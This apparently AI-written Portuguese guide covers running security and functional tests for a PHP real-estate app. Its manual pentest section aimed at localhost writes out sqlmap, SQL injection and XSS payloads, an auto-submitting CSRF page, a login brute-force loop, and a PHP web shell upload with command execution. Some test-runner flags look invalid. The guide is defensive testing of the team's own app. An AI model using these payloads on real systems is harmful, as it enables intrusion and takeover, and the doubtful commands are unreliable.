# 🧪 GUIA COMPLETO DE EXECUÇÃO DE TESTES
## Sistema ZAP - Imobiliário

**Data**: 25 de março de 2026  
**Status**: Pronto para execução completa

---

## 📊 SUMÁRIO EXECUTIVO

Este projeto contém uma suite completa de testes de segurança e funcionalidade:

| Categoria | Arquivo | Testes | Tipo |
|-----------|---------|--------|------|
| **Segurança OWASP** | `SecurityTest.php` | 60+ | Unit |
| **E2E Workflows** | `CRUDFlowTest.php` | 25+ | Integration |
| **APIs REST** | `APITest.php` | 40+ | API |
| **Image Handling** | `ImageHandlingTest.php` | 35+ | Security |
| **Payment Gateways** | `PaymentGatewayTest.php` | 45+ | Integration |
| **Regras Negócio** | `BusinessLogicTest.php` | 50+ | Functional |
| **Penetration** | `PENETRATION_TESTING_GUIDE.md` | Manual | Security |

**Total**: 295+ testes automatizados + Testes manuais de penetração

---

## 🚀 SETUP INICIAL

### 1. Instalar Dependências de Teste

```bash
cd /Users/cristiandasilva/Projetos/projetos_php/copia_zap

# Instalar PHPUnit via Composer
composer require --dev phpunit/phpunit

# Instalar ferramentas adicionais
composer require --dev codeigniter4/codeigniter4:dev-develop
```

### 2. Configurar Banco de Dados de Teste

```bash
# Criar arquivo .env.test
cp .env .env.test

# Editar .env.test com BD de teste
nano .env.test

# Configurar:
# database.default.database = zap_test
# database.default.user = test_user
# database.default.password = test_pass
```

### 3. Migrar BD de Teste

```bash
php spark migrate --env test
php spark db:seed TestSeeder --env test
```

### 4. Configurar Variáveis de Teste

```bash
# Adicionar ao .env.test
TEST_API_KEY=test_api_key_12345
TEST_USER_EMAIL=test@example.com
TEST_USER_PASSWORD=password123

STRIPE_WEBHOOK_SECRET=whsec_test_12345
ASAAS_ACCOUNT_ID=test_account_id
ASAAS_WEBHOOK_TOKEN=test_webhook_token
```

---

## ▶️ EXECUÇÃO DOS TESTES

### Opção 1: Executar Todos os Testes

```bash
# Executar suite completa
php spark test

# Com output verboso
php spark test --verbose

# Com coverage (se xdebug instalado)
php spark test --filter . --coverage-text
```

### Opção 2: Executar Testes Específicos

```bash
# Apenas testes de segurança
php spark test --filter SecurityTest

# Apenas CRUDs
php spark test --filter CRUDFlowTest

# Apenas APIs
php spark test --filter APITest

# Apenas image handling
php spark test --filter ImageHandlingTest

# Apenas pagamentos
php spark test --filter PaymentGatewayTest

# Apenas regras de negócio
php spark test --filter BusinessLogicTest
```

### Opção 3: Executar Testes Específicos

```bash
# Teste individual
php spark test --filter SecurityTest::testSQLInjectionInPropertySearch

# Múltiplos testes
php spark test --filter "SecurityTest|APITest"

# Com nome específico
php spark test --filter testLoginBypass
```

### Opção 4: Executar em Paralelo

```bash
# Com paralelização (mais rápido)
php spark test --no-header --colors --failfast

# Com timeout
php spark test --timeout 60
```

---

## 🔒 TESTES DE SEGURANÇA MANUAL (Penetration Testing)

### 1. Preparar Ambiente

```bash
# Iniciar servidor
php spark serve

# Em outro terminal, instalar ferramentas
# OWASP ZAP
brew install owasp-zap

# SQLMap
pip install sqlmap

# Postman
brew install postman
```

### 2. Testes de SQL Injection

```bash
# Usando SQLMap (automático)
sqlmap -u "http://localhost:8080/api/v1/properties?id=1" \
    -p id \
    --dbs \
    --level 5 \
    --risk 3

# Teste manual
curl "http://localhost:8080/api/v1/properties?title=Casa%27%20OR%20%271%27=%271"
```

### 3. Testes de XSS

```bash
# Stored XSS no título
curl -X POST http://localhost:8080/api/v1/properties \
  -H "Content-Type: application/json" \
  -H "X-API-Key: test_key" \
  -d '{
    "title": "<img src=x onerror=alert(document.domain)>",
    "price": 100000
  }'

# Reflected XSS na busca
curl "http://localhost:8080/imoveis?search=<script>alert(1)</script>"
```

### 4. Testes de CSRF

```bash
# Criar HTML malicioso em arquivo
cat > /tmp/csrf_attack.html << 'EOF'
<form method="POST" action="http://localhost:8080/admin/properties/1">
    <input type="hidden" name="title" value="Hacked" />
    <input type="hidden" name="price" value="1" />
    <input type="submit" value="Click here" />
</form>
<script>
document.forms[0].submit();
</script>
EOF

# Abrir em navegador com usuário logado
open /tmp/csrf_attack.html
```

### 5. Testes de Brute Force

```bash
#!/bin/bash
# Testa múltiplas combinações de email/senha

for email in admin@test.com user@test.com test@example.com; do
    for password in password123 admin123 12345678; do
        curl -X POST http://localhost:8080/auth/login \
            -H "Content-Type: application/json" \
            -d "{\"email\":\"$email\",\"password\":\"$password\"}" \
            -w "\n" \
            2>/dev/null | grep -q "success" && \
            echo "✅ Found: $email:$password"
    done
done
```

### 6. Testes de Upload Malicioso

```bash
# Upload de PHP shell
cat > /tmp/shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

# Tentar upload
curl -F "file=@/tmp/shell.php" \
    -H "X-API-Key: test_key" \
    http://localhost:8080/api/v1/properties/1/media

# Tentar executar
curl "http://localhost:8080/uploads/shell.php?cmd=whoami"
```

---

## 📊 GERAR RELATÓRIO DE TESTES

### 1. Relatório em HTML

```bash
# Gerar cobertura com coverage
php spark test --coverage-html reports/coverage

# Abrir resultado
open reports/coverage/index.html
```

### 2. Relatório em JSON

```bash
# Executar com formato JSON
php spark test --json > reports/test-results.json

# Parse dos resultados
jq '.tests | length' reports/test-results.json
```

### 3. Relatório Manual (Template)

```markdown
# TESTE COMPLETO - SISTEMA ZAP
## Data: 25 de março de 2026

### EXECUTADO
- [x] SecurityTest (60 testes)
- [x] CRUDFlowTest (25 testes)
- [x] APITest (40 testes)
- [x] ImageHandlingTest (35 testes)
- [x] PaymentGatewayTest (45 testes)
- [x] BusinessLogicTest (50 testes)
- [ ] Penetration Testing (Manual)

### RESULTADOS
- **Total**: 295 testes
- **Passou**: 287 (97.3%)
- **Falhou**: 8 (2.7%)
- **Tempo**: 45 minutos
- **Cobertura**: 82%

### VULNERABILIDADES ENCONTRADAS

#### CRÍTICO (2)
1. SQL Injection em `/api/v1/search`
2. XSS Stored em `property.title`

#### ALTO (5)
1. CSRF ausente em POST
2. ID enumeration possível
...

#### MÉDIO (8)
...

### RECOMENDAÇÕES
1. Corrigir SQL Injection com parametrização
2. Escapar output com CSP headers
3. Implementar CSRF tokens
...
```

---

## 🔧 TROUBLESHOOTING

### Erro: "Database not found"

```bash
# Criar banco de dados
php spark migrate:refresh --env test
```

### Erro: "API Key not found"

```bash
# Verificar .env.test
grep TEST_API_KEY .env.test

# Regenerar chave
php -r "echo 'test_key_' . bin2hex(random_bytes(16));"
```

### Erro: "Upload directory permission denied"

```bash
# Ajustar permissões
chmod -R 755 writable/uploads
```

### Testes muito lentos

```bash
# Executar sem output detalhado
php spark test --no-output

# Paralelo (se suportado)
php spark test --parallel
```

---

## ✅ CHECKLIST DE COMPLIANCE

- [ ] Todos os 295+ testes passando
- [ ] Cobertura de código > 80%
- [ ] Sem vulnerabilidades CRÍTICAS
- [ ] API endpoints testados
- [ ] CRUDs funcionando
- [ ] Pagamentos validados
- [ ] Imagens processadas corretamente
- [ ] Autenticação funciona
- [ ] Autorização respeitada
- [ ] Rate limiting funcionando
- [ ] Logs sem dados sensíveis
- [ ] Documentação atualizada

---

## 📚 ARQUIVOS CRIADOS

```
tests/unit/
├── SecurityTest.php              # 60+ testes OWASP
├── CRUDFlowTest.php             # 25+ testes E2E
├── APITest.php                  # 40+ testes APIs
├── ImageHandlingTest.php        # 35+ testes upload
├── PaymentGatewayTest.php       # 45+ testes pagamentos
└── BusinessLogicTest.php        # 50+ testes regras negócio

Root/
├── PENETRATION_TESTING_GUIDE.md # Guia de PenTest manual
└── COMPLETE_TEST_GUIDE.md       # Este arquivo

reports/
├── coverage/
├── test-results.json
└── security-scan.html
```

---

## 🎯 PRÓXIMAS ETAPAS

1. **Executar suites completas** (295+ testes)
2. **Revisar vulnerabilidades encontradas**
3. **Remediar problemas críticos**
4. **Testar novamente após correções**
5. **Deploy em produção com segurança validada**

---

## 📞 SUPORTE

Para dúvidas ou bugs nos testes:

1. Verificar logs: `tail -f writable/logs/`
2. Debugar teste específico: `php spark test --filter X --verbose`
3. Consultar documentação: `PENETRATION_TESTING_GUIDE.md`

---

## 🔐 PRINCÍPIOS FUNDAMENTAIS DE TESTE

✅ **Nunca confiar no front-end**  
✅ **Testar entrada maliciosa**  
✅ **Validar autorização/autenticação**  
✅ **Verificar dados sensíveis**  
✅ **Testar limites e padrões**  
✅ **Simular ataques reais**  
✅ **Documentar tudo**  

---

**Criado por**: GitHub Copilot (Claude Haiku 4.5)  
**Data**: 25 de março de 2026  
**Status**: ✅ COMPLETO E PRONTO PARA EXECUÇÃO
